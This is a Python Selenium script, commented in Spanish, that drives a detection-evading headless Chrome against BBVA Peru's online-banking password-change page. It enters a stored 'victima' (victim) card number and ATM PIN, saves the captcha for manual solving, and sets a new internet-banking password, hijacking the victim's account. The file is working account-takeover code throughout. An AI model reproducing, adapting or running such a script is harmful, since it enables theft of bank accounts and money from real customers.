import undetected_chromedriver as uc
import time
from selenium.webdriver.common.by import By
from selenium.webdriver.firefox.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium import webdriver
import time
import requests


class XPATHS:
    numDocumento = '//*[@id="mat-input-0"]'
    btn_continuar1 = '//*[@id="undefined"]/button'

class Values:
	victima_tar = '4919148321324203'
	victima_pasw = '1234'

if __name__ == '__main__':
	# Define a custom user agent
	my_user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"

	# Set up Chrome options
	options = uc.ChromeOptions()
	options.add_argument("--headless")  # Elimina este comentario si quieres ver la ventana del navegador
	options.add_argument("--incognito")  # Añade esta línea para abrir en modo incógnito
	options.add_argument(f"user-agent={my_user_agent}")

	# Initialize Chrome WebDriver with the specified options
	driver = uc.Chrome(options=options)

	# Make a request to your target website.
	driver.get("https://bancaporinternet.bbva.pe/bdpnux_pe_web_85/bdpnux_pe_web/aem/modificacion/index?_ga=1")
	driver.save_screenshot("screenshot.png")  # Captura una captura de pantalla para verificar que la página se cargó correctamente

	wait0 = WebDriverWait(driver, 20)
	wait0.until(EC.visibility_of_element_located((By.XPATH, '//*[@id="numeroTarjeta"]')))

	driver.find_element(By.XPATH, '//*[@id="numeroTarjeta"]').send_keys(str(Values.victima_tar)) # Poniendo el usuario
	driver.find_element(By.XPATH, '//*[@id="claveCajero"]').send_keys(str(Values.victima_pasw)) # Poniendo la contraseña

	#Intentar capturar captcha
	driver.save_screenshot("screenshot2.png")

	# Encontrar el elemento de la imagen utilizando su XPath (o cualquier otro selector que prefieras)
	imagen_elemento = driver.find_element(By.XPATH, '//*[@id="identificacion"]/div[1]/div[2]/div[4]/div/div/div/div/div/span[1]')

	# Guardar la imagen en un archivo local
	with open('captcha.png', 'wb') as archivo:
	    archivo.write(imagen_elemento.screenshot_as_png)

	catpcha = input("escriba el captcha > ")

	driver.find_element(By.XPATH, '//*[@id="codigoCaptcha"]').send_keys(str(catpcha)) # Poniendo la contraseña
	driver.save_screenshot("screenshot3.png")

	# Hacer clic en el botón wizardNext
	driver.find_element(By.XPATH, '//*[@id="wizardNext"]').click()

	# Esperar un tiempo para que la nueva página se cargue completamente (ajusta este tiempo según sea necesario)
	time.sleep(5)

	# Obtener los identificadores de las ventanas después de hacer clic en wizardNext
	nuevas_ventanas = driver.window_handles

	# Imprimir las URL de las nuevas pestañas
	for ventana in nuevas_ventanas:
	    driver.switch_to.window(ventana)
	    print("URL de la pestaña actual:", driver.current_url)

	time.sleep(3)
	driver.save_screenshot("screenshot4.png")
	print('\n')
	contrasenaasignada = input("Escriba Pass: ")
	#contrapass = 'Chicharo0' , contrasenaasignada

	driver.find_element(By.XPATH, '//*[@id="claveInternet"]').send_keys(str(contrasenaasignada)) # Poniendo la contraseña

	driver.find_element(By.XPATH, '//*[@id="claveInternetConfirmada"]').send_keys(str(contrasenaasignada)) # Poniendo la contraseña

	input("Continuar ventana")






	# Close the driver
	driver.quit()
	print("Selenium script executed successfully.")
